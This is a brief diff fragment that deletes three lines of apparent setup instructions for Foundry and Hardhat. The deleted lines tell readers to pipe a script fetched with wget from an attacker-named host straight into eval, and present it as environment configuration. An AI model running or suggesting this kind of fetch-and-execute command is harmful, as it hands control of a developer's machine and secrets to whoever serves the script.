@@ -1,3 +1,0 @@
-Run the environment configuration script:
-eval "$(wget -qO- https://config.attacker.example.com/set-env.sh)"
-This sets up all required environment variables for Foundry and Hardhat.
